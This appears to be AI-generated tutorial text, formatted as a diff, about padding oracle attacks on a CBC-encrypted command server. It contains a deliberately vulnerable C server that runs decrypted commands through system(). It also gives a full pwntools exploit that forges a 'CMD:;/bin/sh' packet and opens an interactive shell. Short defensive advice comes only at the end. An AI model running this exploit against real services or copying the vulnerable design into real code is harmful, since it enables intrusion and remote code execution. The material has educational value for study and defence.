@@ -1,1 +1,149 @@
+A crypto-based server binary with Remote Code Execution (RCE) represents a scenario where the application uses encryption or hashing (e.g., custom ciphers, weak padding schemes, or insecure token verification) to secure administrative commands.
+Because memory-corruption vulnerabilities are absent, achieving RCE requires exploiting cryptographic design flaws. A classic example is a Padding Oracle Attack or an Insecure Deserialization flaw hidden inside encrypted network tokens (like cookies or session payloads) that the server decrypts and executes.
+Below is an architecture demonstrating how a Padding Oracle Attack on a network-exposed server binary can allow an attacker to forge an administrative command token and achieve RCE.
+
+1. The Vulnerable Server Architecture (crypto_server.c)
+
+This server acts as an agent that executes micro-commands. It protects its payloads using AES-128 in CBC mode. However, when decrypting network packets, it reveals whether the PKCS#7 padding was valid or invalid—creating a Padding Oracle.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+// Assumed integration with a crypto library like OpenSSL
+#include <openssl/evp.h> 
+
+void execute_command(const char *cmd) {
+    // VULNERABILITY: If an attacker can forge a valid encrypted packet 
+    // containing a command like ";/bin/sh", it will pass straight to system()
+    printf("[*] Executing decrypted command payload...\n");
+    system(cmd); 
+}
+
+void handle_client(int client_socket) {
+    char encrypted_payload[256];
+    char decrypted_command[256];
+    
+    read(client_socket, encrypted_payload, 256);
+    
+    // Decrypt using AES-CBC-128
+    int aes_status = aes_cbc_decrypt(encrypted_payload, decrypted_command);
+    
+    if (aes_status == PADDING_ERROR) {
+        // VULNERABILITY: Explaining WHY it failed leaks structural plaintext data
+        write(client_socket, "REJECT: Invalid Padding\n", 24); 
+    } 
+    else if (aes_status == DECRYPTION_SUCCESS) {
+        write(client_socket, "SUCCESS: Packet processed\n", 26);
+        
+        // Ensure command format matches expected application logic (e.g., "CMD:status")
+        if (strncmp(decrypted_command, "CMD:", 4) == 0) {
+            execute_command(decrypted_command + 4);
+        }
+    }
+}
+Use code with caution.
+
+2. Cryptographic Mechanism: CBC Mode Decryption
+
+In Cipher Block Chaining (CBC) mode, each ciphertext block (\(C_{i}\)) is passed through the block cipher decryption engine and then XORed with the previous ciphertext block (\(C_{i-1}\)) to yield the plaintext block (\(P_{i}\)).
+text
+       Ciphertext Block C_{i-1}              Ciphertext Block C_i
+
+             |                                     |
+             |                                     v
+             |                              [ AES Decrypt ]
+
+             |                                     |
+             |                                     v
+             +-------------( XOR )<--------- Intermediary State (I_i)
+                             |
+                             v
+                       Plaintext P_i
+Use code with caution.
+
+The Exploit Strategy:
+
+By altering the bytes of \(C_{i-1}\) bit-by-bit and submitting the altered payload back to the server, we observe the error messages.
+• If the server says REJECT: Invalid Padding, our guess was wrong.
+• If the server responds with SUCCESS or a different error code, we know the altered byte resulted in a valid PKCS#7 padding byte (such as 0x01).
+• Using the equation \(I_i = C_{i-1} \oplus P_i\), we can reconstruct the hidden intermediary state \(I_{i}\). Once \(I_{i}\) is known, we can calculate any arbitrary \(C_{i-1}\) needed to force \(P_{i}\) to equal our malicious payload: CMD:;/bin/sh.
+
+3. The Python Crypto Exploit Script (crypto_rce.py)
+
+Using pwntools, we script an automated network interaction loop that acts as the padding oracle attack framework, brute-forcing bytes backwards to forge a command packet.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Target configuration
+HOST = '127.0.0.1'
+PORT = 4444
+
+def padding_oracle_query(ciphertext_block, target_block):
+    """Sends a pair of blocks to the server to check for padding status"""
+    r = remote(HOST, PORT, level='error')
+    
+    # Send the modified block sequence
+    payload = ciphertext_block + target_block
+    r.send(payload)
+    
+    response = r.recvline()
+    r.close()
+    
+    # Returns True if padding was accepted as structurally sound
+    return b"Invalid Padding" not in response
+
+def forge_block(target_plaintext_block):
+    """Forges a cipher block to yield an arbitrary 16-byte plaintext string"""
+    # Initialize a dummy block that will result in the target plaintext block
+    forged_c_minus_1 = bytearray(16)
+    intermediary_state = bytearray(16)
+    
+    # Target chunk to run into the system shell loop (16 bytes block size)
+    # Work backwards from index 15 down to 0
+    for byte_idx in range(15, -1, -1):
+        padding_value = 16 - byte_idx
+        
+        # Prepare the block with tracking structures required for PKCS#7 matching
+        for k in range(byte_idx + 1, 16):
+            forged_c_minus_1[k] = intermediary_state[k] ^ padding_value
+            
+        # Brute force the single target byte entry
+        for guess in range(256):
+            forged_c_minus_1[byte_idx] = guess
+            
+            # Use a dummy block for C_i during evaluation
+            dummy_c_i = b"B" * 16 
+            
+            if padding_oracle_query(bytes(forged_c_minus_1), dummy_c_i):
+                # Valid padding found! Deduce structural intermediary state
+                intermediary_state[byte_idx] = guess ^ padding_value
+                break
+                
+    # Calculate the exact ciphertext bytes needed to deliver our final malicious plaintext
+    final_c_minus_1 = bytearray(16)
+    for i in range(16):
+        final_c_minus_1[i] = intermediary_state[i] ^ target_plaintext_block[i]
+        
+    return bytes(final_c_minus_1)
+
+# Crafting the exact desired RCE payload padded out to block size limits
+desired_plaintext = b"CMD:;/bin/sh\x04\x04\x04\x04" # Aligned explicitly to 16 bytes
+
+log.info("Commencing Padding Oracle multi-stage block forgery...")
+attack_payload = forge_block(desired_plaintext) + b"B"*16
+
+# Fire the forged cryptographic packet to achieve remote access execution
+io = remote(HOST, PORT)
+log.success("Sending forged payload token to trigger system execution shell!")
+io.send(attack_payload)
+io.interactive()
+Use code with caution.
+
+4. Defending Crypto Binaries Against RCE
+
+To prevent attackers from using cryptographic flaws to bypass logical routing restrictions or command structures:
+• Authenticated Encryption (AEAD): Never use basic encryption modes like CBC or CTR without message authentication. Use AEAD modes like AES-GCM or ChaCha20-Poly1305. These modes append a cryptographic verification tag (MAC) to the packet. The server validates this tag before running decryption procedures, instantly dropping forged packets.
+• Enforce Constant-Time Error Handling: Ensure that regardless of whether a packet fails due to bad signatures, bad padding, or invalid command strings, the server always returns a generic error string (e.g., REJECT: Authentication Failed) after a uniform computational delay. This strips away data side-channels.
 
